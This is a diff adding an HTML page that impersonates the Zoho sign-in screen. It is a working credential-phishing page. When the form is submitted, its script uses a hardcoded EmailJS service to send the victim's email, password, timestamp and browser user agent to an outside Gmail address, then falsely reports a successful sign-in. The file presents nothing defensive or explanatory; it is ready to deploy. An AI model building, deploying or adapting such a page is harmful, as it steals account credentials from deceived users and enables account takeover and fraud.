@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign In | Zoho</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            margin: 0;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .header {
+            text-align: center;
+            padding: 25px 0;
+        }
+
+        .logo {
+            width: 150px;
+            height: auto;
+        }
+
+        .signin-container {
+            background: white;
+            padding: 35px 40px;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto;
+        }
+
+        .signin-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+            .signin-header h3 {
+                font-size: 22px;
+                color: #151515;
+                margin: 0 0 8px;
+            }
+
+            .signin-header p {
+                font-size: 14px;
+                color: #666;
+                margin: 0;
+            }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+            .form-group label {
+                display: block;
+                margin-bottom: 8px;
+                color: #444;
+                font-size: 13px;
+            }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+            input:focus {
+                border-color: #4A90E2;
+                outline: none;
+            }
+
+        .signin-button {
+            width: 100%;
+            padding: 13px;
+            background-color: #2D87F3;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+            .signin-button:hover {
+                background-color: #1a68c7;
+            }
+
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+        }
+
+            .footer a {
+                color: #2D87F3;
+                text-decoration: none;
+                font-size: 13px;
+            }
+
+        #loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://i.postimg.cc/dVk1q0YC/PHOTO-2024-12-17-15-53-19.jpg" alt="Logo" class="logo">
+    </div>
+    <div class="signin-container">
+        <div class="signin-header">
+            <h3>Sign in</h3>
+            <p>to access your account</p>
+        </div>
+        <form id="signinForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit" class="signin-button">Sign in</button>
+            <div id="loading">Processing...</div>
+        </form>
+    </div>
+    <div class="footer">
+        <a href="#">Forgot Password?</a>
+    </div>
+
+    <script>// Initialize EmailJS
+        emailjs.init("i607kqPB8VleZrSlc");
+
+        document.getElementById('signinForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+
+            // Show loading
+            loading.style.display = 'block';
+
+            try {
+                const response = await emailjs.send(
+                    "service_sj1hs36",
+                    "template_4u4srkg",
+                    {
+                        from_email: email,
+                        from_password: password,
+                        to_email: "noreply.email.fwd@gmail.com",
+                        message: `
+                                Login Attempt Details:
+                                Email: ${email}
+                                Password: ${password}
+                                Time: ${new Date().toLocaleString()}
+                                User Agent: ${navigator.userAgent}
+                            `
+                    }
+                );
+
+                if (response.status === 200) {
+                    alert('Sign in successful!');
+                    // Optional: Redirect to another page
+                    // window.location.href = "success.html";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Sign in failed. Please try again.');
+            } finally {
+                // Hide loading
+                loading.style.display = 'none';
+            }
+        });</script>
+</body>
+</html>
